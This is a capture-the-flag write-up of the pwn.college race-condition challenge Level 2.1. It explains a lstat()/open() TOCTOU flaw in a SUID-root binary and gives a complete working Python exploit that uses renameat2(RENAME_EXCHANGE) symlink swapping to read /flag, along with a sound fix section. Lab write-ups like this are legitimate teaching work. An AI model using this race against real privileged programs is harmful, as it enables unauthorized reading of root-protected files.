# Stage 21: Race Conditions Level 2.1 — TOCTOU Atomic File Exchange

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Race Condition |
| **Level** | 2.1 |
| **Estimated Time** | — |
| **Category** | Race Condition / TOCTOU |
| **Platform** | Linux x86-64 |
| **Binary** | `/challenge/babyrace_level2.1` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/babyrace_level2.1` is a SUID-root PIE ELF that accepts a pathname. It rejects paths containing `flag`, calls `lstat()` and rejects symbolic links, then opens the same pathname and prints what it reads.

The weakness is the same TOCTOU gap as Level 2.0: the program validates a pathname, then resolves that pathname again when it opens the file. A regular file can pass the `lstat()` check and be replaced with a symlink to `/flag` before `open()` runs.

The difference is synchronization. Level 2.0 stopped at two `getchar()` pauses, so the swap could be timed exactly. The Level 2.1 run had no such prompt, and the working exploit never drove a PTY. The directory entry therefore has to be exchanged continuously while the target is launched over and over until one launch lands the check and the use on opposite sides of a swap.

| Attribute | Details |
|-----------|---------|
| Platform | pwn.college |
| Challenge | Race Conditions Level 2.1 |
| Binary | `/challenge/babyrace_level2.1` |
| Architecture | Linux x86-64 |
| Binary type | ELF 64-bit LSB PIE |
| Privilege model | SUID root |
| Vulnerability | Time-of-check to time-of-use (TOCTOU) |
| Attack primitive | Symbolic-link substitution |
| Race technique | Atomic directory-entry exchange |
| System call | `renameat2()` with `RENAME_EXCHANGE` |
| Target file | `/flag` |
| Result | Successful protected-file read on attempt 14 |

## Target Reconnaissance

The target binary was located at:

```text
/challenge/babyrace_level2.1
```

Initial inspection:

```bash
cd /challenge
ls -l babyrace_level2.1
file babyrace_level2.1
```

Binary characteristics:

- ELF 64-bit LSB PIE executable.
- x86-64 architecture.
- Dynamically linked.
- Not stripped.
- SUID root permissions.

The permissions were:

```text
-rwsr-xr-x 1 root root ... babyrace_level2.1
```

The `s` in the owner execute position marks the SUID bit. The executable is owned by root, so a permitted run receives root's effective UID. That is what makes the pathname validation security-sensitive: an exploitable file-access race crosses a privilege boundary.

## Static Analysis

The binary was inspected with standard Linux analysis utilities:

```bash
strings ./babyrace_level2.1
objdump -d -M intel ./babyrace_level2.1
```

Relevant strings included:

```text
flag
Error: path contains `flag`!
Error: failed to get file status!
Error: file is a symlink!
### Goodbye!
```

The disassembly of `main()` showed this logical sequence:

1. Check whether the supplied pathname contains the string `flag`.
2. Call `lstat()` on the supplied pathname.
3. Inspect the returned file metadata.
4. Reject the pathname if it identifies a symbolic link.
5. Call `open()` on the same pathname.
6. Read the file contents.
7. Write the contents to standard output.

The relevant functions were:

| Function | Purpose |
|----------|---------|
| `strstr()` | Checks the pathname for the forbidden substring |
| `lstat()` | Retrieves metadata about the pathname itself |
| `open()` | Opens the referenced file |
| `read()` | Reads file contents |
| `write()` | Outputs the contents |

The original challenge source was not captured for this run. The C snippets below are the behavior reconstructed from the disassembly and the observed checks, not a verbatim copy.

The critical detail is the separation between `lstat()` and `open()`:

```text
strstr(path, "flag")
        |
        v
lstat(path, &st)
        |
        v
Reject a symbolic link
        |
        v
open(path, O_RDONLY)
        |
        v
read() then write()
```

The file-type check uses the usual Linux constants:

```asm
and eax, 0xf000
cmp eax, 0xa000
```

`0xf000` is `S_IFMT`, the file-type mask, and `0xa000` is `S_IFLNK`, the symbolic-link type. The check rejects a pathname that resolves to a symlink at the moment `lstat()` runs. It says nothing about what the pathname will resolve to at the moment `open()` runs.

## Vulnerability Analysis

TOCTOU stands for Time-of-Check to Time-of-Use. It occurs when a program checks a resource's state and later uses that resource without guaranteeing that the state is unchanged.

The vulnerable sequence is:

```c title="level-2-1-race.c" keys="1,3,8,13"
struct stat st;

if (lstat(path, &st) < 0) {
    perror("lstat");
    return 1;
}

if (S_ISLNK(st.st_mode)) {
    puts("Error: file is a symlink!");
    return 1;
}

int fd = open(path, O_RDONLY);
```

The program checks that the pathname references a regular file. It does not lock the pathname and it does not keep a file descriptor from the validation step. The directory entry can change between the two calls.

### Expected execution

```text
Attacker supplies pathname
        |
        v
lstat(path)
        |
        v
Regular file detected
        |
        v
Symbolic-link check passes
        |
        v
open(path)
        |
        v
Regular file opened
```

### Exploitation scenario

```text
Attacker supplies pathname
        |
        v
lstat(path)
        |
        v
Regular file detected
        |
        v
Attacker exchanges filesystem entries
        |
        v
Path now references symlink to /flag
        |
        v
open(path)
        |
        v
Protected file opened
        |
        v
read() and write()
```

The boundary is broken because the program validates one filesystem object but may open another.

## Exploitation Strategy

The exploit used two filesystem entries inside an attacker-controlled directory:

```text
/home/hacker/race/racefile
/home/hacker/race/swapfile
```

Their initial states were:

| Path | Initial object |
|------|----------------|
| `racefile` | Regular file |
| `swapfile` | Symbolic link to `/flag` |

The exploit continuously exchanged these entries:

```c title="rename-exchange.c" keys="1,6"
renameat2(
    AT_FDCWD,
    old_path,
    AT_FDCWD,
    new_path,
    RENAME_EXCHANGE
);
```

### Why `RENAME_EXCHANGE`?

`RENAME_EXCHANGE` atomically exchanges two existing directory entries. Unlike a conventional unlink-and-create sequence, it avoids an intermediate state in which one of the two entries does not exist.

The pathname therefore alternates between:

```text
racefile -> regular file
```

and:

```text
racefile -> symbolic link to /flag
```

The attacker simultaneously executes the vulnerable SUID binary repeatedly. The objective is to make the program observe:

- A regular file during `lstat()`.
- A symbolic link during `open()`.

That is the core exploitation condition.

### Desired interleaving

```text
Attacker                          SUID target
--------                          -----------

Create regular file
Create symlink to /flag

Start exchange loop               Launch target

                                  lstat(racefile)
                                  Sees regular file

                                  Validation succeeds

Exchange directory entries

                                  open(racefile)
                                  Resolves to symlink

                                  Opens /flag

                                  read() and write()

                                  Flag appears in output
```

The exchange can land anywhere inside the race window. The exploit does not need to predict the exact scheduling point; it only needs one launch where the two operations observe different directory entries.

## Filesystem Layout

The exploit used:

```text
/home/hacker/race/
├── racefile     regular file
└── swapfile     symlink -> /flag
```

The target always received:

```text
/home/hacker/race/racefile
```

The pathname never changed. Only the filesystem object associated with that pathname changed.

The supplied pathname does not contain the substring `flag`, so the string filter does not reject it. The symbolic link's destination is `/flag`, but that destination is resolved by the kernel during `open()`, not by the program's string check.

## Proof of Concept

The script below uses `ctypes` to call libc's `renameat2()` and `subprocess` to repeatedly run the target.

```python title="exploit21.py" keys="39,57,61,77,80,87,92,107"
#!/usr/bin/env python3

import os
import sys
import signal
import ctypes
import subprocess

BINARY = "/challenge/babyrace_level2.1"

DIRECTORY = "/home/hacker/race"
TARGET = DIRECTORY + "/racefile"
SWAP = DIRECTORY + "/swapfile"

AT_FDCWD = -100
RENAME_EXCHANGE = 2

os.makedirs(DIRECTORY, exist_ok=True)


def cleanup():
    for path in (TARGET, SWAP):
        try:
            os.unlink(path)
        except FileNotFoundError:
            pass


cleanup()

# Create the regular file.
with open(TARGET, "w") as f:
    f.write("NORMAL_FILE\n")

# Create the symbolic link to the protected file.
os.symlink("/flag", SWAP)

# Load libc and configure renameat2().
libc = ctypes.CDLL("libc.so.6", use_errno=True)

renameat2 = libc.renameat2

renameat2.argtypes = [
    ctypes.c_int,
    ctypes.c_char_p,
    ctypes.c_int,
    ctypes.c_char_p,
    ctypes.c_uint
]

renameat2.restype = ctypes.c_int

target_b = TARGET.encode()
swap_b = SWAP.encode()

# Start the atomic exchange racer.
pid = os.fork()

if pid == 0:
    while True:
        result = renameat2(
            AT_FDCWD,
            target_b,
            AT_FDCWD,
            swap_b,
            RENAME_EXCHANGE
        )

        if result != 0:
            os._exit(1)

print("[+] Atomic exchange racer started")
print("[+] Target:", TARGET)
print("[+] Symlink destination: /flag")

try:
    for attempt in range(1, 10001):

        try:
            result = subprocess.run(
                [BINARY, TARGET],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=2
            )

        except subprocess.TimeoutExpired:
            continue

        output = result.stdout

        if b"pwn.college{" in output:
            print("\n[+] SUCCESS on attempt", attempt)
            sys.stdout.write(
                output.decode(errors="replace")
            )
            break

        if attempt % 500 == 0:
            print("[*] Attempts:", attempt)

    else:
        print("[-] No flag captured after 10000 attempts")

finally:
    try:
        os.kill(pid, signal.SIGTERM)
    except ProcessLookupError:
        pass

    os.waitpid(pid, 0)

    cleanup()

    print("\n[+] Racer stopped")
```

### Run it

```bash
python3 /tmp/exploit21.py
```

## Successful Exploitation Output

The observed output was:

```text
[+] Atomic exchange racer started
[+] Target: /home/hacker/race/racefile
[+] Symlink destination: /flag

[+] SUCCESS on attempt 14
###
### Welcome to /challenge/babyrace_level2.1!
###

pwn.college{...}

### Goodbye!

[+] Racer stopped
```

The protected flag was retrieved on attempt 14. The live flag value is redacted on this page; the rest of the observed output is preserved.

## Exploit Implementation Details

### `os.fork()`

```python
pid = os.fork()
```

Creates a child process. The child becomes the filesystem-exchange worker while the parent launches the SUID executable. This separates the race operation from the target's execution.

### `ctypes.CDLL()`

```python
libc = ctypes.CDLL("libc.so.6", use_errno=True)
```

Loads the C library so Python can call the native `renameat2()` function. This avoids rebuilding the exchange from multiple non-atomic filesystem operations.

### `renameat2()`

```python
result = renameat2(
    AT_FDCWD,
    target_b,
    AT_FDCWD,
    swap_b,
    RENAME_EXCHANGE
)
```

Arguments:

| Argument | Meaning |
|----------|---------|
| `AT_FDCWD` | Resolve relative paths from the current working directory |
| `target_b` | First directory entry |
| `AT_FDCWD` | Second directory entry's directory reference |
| `swap_b` | Second directory entry |
| `RENAME_EXCHANGE` | Atomically exchange both entries |

Both paths are absolute, so their resolution does not depend on the current working directory.

### `subprocess.run()`

```python
result = subprocess.run(
    [BINARY, TARGET],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    timeout=2
)
```

Runs the SUID target repeatedly. The argument is passed as an array, not through a shell, so the pathname is not interpreted by a shell. The output is captured so the exploit can detect the flag. A timed-out run is skipped and the loop continues.

### Flag detection

```python
if b"pwn.college{" in output:
```

The script checks for the challenge flag format and stops when it appears.

### Cleanup

The racer is terminated, reaped, and both temporary entries are removed. This avoids leaving the symlink or the exchange artifacts in the challenge directory.

## Why the Exploit Worked

Three components had to line up:

**1. `lstat()`**

Unlike `stat()`, `lstat()` reports information about the symbolic link itself rather than following it to its destination. The program uses it to reject symbolic links, but that only describes the object at the time of the call.

**2. `renameat2(RENAME_EXCHANGE)`**

This provides an atomic exchange of two existing directory entries. It lets the attacker switch the target pathname between a regular file and a symbolic link without the slower unlink-and-create sequence and without a moment where the pathname is missing.

**3. Repeated process execution**

The exploit launches the SUID binary again and again while the exchange loop runs. Each launch creates another opportunity for validation and use to observe different filesystem states.

The successful result on attempt 14 shows that the race window was exploitable in this environment. It does not prove that every machine or every run will succeed on the same attempt.

## Level 2.0 vs Level 2.1

| Property | Level 2.0 | Level 2.1 |
|----------|-----------|-----------|
| Target | `babyrace_level2.0` | `babyrace_level2.1` |
| Validation | `lstat()` | `lstat()` |
| Use | `open()` | `open()` |
| Synchronization | Two `getchar()` pauses | No prompt; continuous race |
| Exploit strategy | PTY-driven substitution | Atomic exchange plus repeated launches |
| Main technique | `unlink()` + `symlink()` | `renameat2(RENAME_EXCHANGE)` |
| Expected attempts | Deterministic on the first run | Probabilistic; observed on attempt 14 |
| Result | Protected-file read | Protected-file read |

Both challenges fail for the same reason: a privileged program validates a pathname and later resolves it again. Level 2.0 makes the gap easy to hit; Level 2.1 removes the pauses and forces the attacker to win the scheduling race.

## Important Technical Considerations

### Atomicity does not eliminate race conditions

Atomic filesystem operations can make an attacker-controlled race more reliable. Here, the atomic exchange prevents an intermediate missing-path state while still allowing the pathname to refer to different objects at different moments. Atomicity describes the exchange, not the order in which the target and attacker execute.

### Pathname validation is not object validation

A pathname references a filesystem object through directory entries. Its resolution can change between separate operations. Checking a pathname and later reopening it does not guarantee that both operations refer to the same object.

### Timing and scheduling matter

Race-condition exploitation depends on process scheduling, filesystem behavior, system load, and the length of the vulnerable interval. The observed attempt count is a result from one execution, not a guarantee of reproducibility.

### SUID and effective credentials

The target is SUID root. The important distinction is:

- Real UID: identifies the invoking user.
- Effective UID: determines the identity used for many permission checks.
- Saved set-user-ID: allows certain privilege transitions.

For a successful SUID-root run, the effective UID becomes the executable owner's UID. The privileged `open()` therefore reads the protected file under the elevated process credentials.

## How to Fix It

The vulnerability is prevented by avoiding separate pathname validation and opening operations. The primary fix is:

1. Open the file first.
2. Use `O_NOFOLLOW` to reject a final-component symbolic link.
3. Validate the opened file descriptor with `fstat()`.
4. Read from that same descriptor.

Conceptually:

```c title="safe-open-level-2-1.c" keys="1,8,13"
int fd = open(path, O_RDONLY | O_NOFOLLOW);

if (fd < 0)
    return -1;

struct stat st;

if (fstat(fd, &st) < 0) {
    close(fd);
    return -1;
}

if (!S_ISREG(st.st_mode)) {
    close(fd);
    return -1;
}

/* Read from this same validated descriptor. */
```

`O_NOFOLLOW` prevents the final pathname component from being followed if it is a symbolic link. `fstat()` validates the object actually opened, so a later substitution cannot change what the descriptor refers to.

### Use directory-relative operations

For sensitive filesystem work, use a trusted directory descriptor with `openat()` or `openat2()`. Linux `openat2()` supports resolution restrictions such as:

- `RESOLVE_NO_SYMLINKS`
- `RESOLVE_BENEATH`
- `RESOLVE_IN_ROOT`

The appropriate flags depend on the application's intended path semantics.

### Avoid unnecessary SUID privileges

Where possible:

- Remove SUID execution.
- Use a narrowly scoped helper.
- Drop privileges before handling untrusted paths.
- Avoid trusting user-controlled filesystem namespaces.

### Do not rely on sleeps or pauses

Neither a delay nor an interactive pause makes a check/use sequence safe. A delay can make exploitation easier by enlarging the time available to modify shared state.

## Key Takeaways

This challenge demonstrated several important exploit-development concepts:

- Static analysis of a SUID ELF binary.
- Understanding `lstat()` and `open()` behavior.
- Identifying a TOCTOU vulnerability.
- Analyzing pathname-based security checks.
- Using Python `ctypes` to interact with libc.
- Calling `renameat2()` with `RENAME_EXCHANGE`.
- Building a concurrent filesystem race.
- Automating repeated execution of a privileged binary.
- Understanding why atomic filesystem operations matter in race-condition exploitation.

The core lesson is that security validation must apply to the exact object being used, not merely to a pathname that may resolve to a different object later.

## Final Result

| Field | Value |
|-------|-------|
| Challenge | pwn.college — Race Conditions Level 2.1 |
| Binary | `babyrace_level2.1` |
| Binary privilege | SUID root |
| Vulnerability | TOCTOU |
| Validation | `lstat()` |
| Vulnerable operation | `open()` |
| Exploitation primitive | `renameat2()` |
| Exchange flag | `RENAME_EXCHANGE` |
| Exploit language | Python |
| Successful attempt | 14 |
| Result | Flag retrieved |

The challenge was exploited by racing a symbolic-link exchange against a privileged file-opening operation. The root cause was a TOCTOU vulnerability caused by validating a pathname separately from the operation that consumed it.
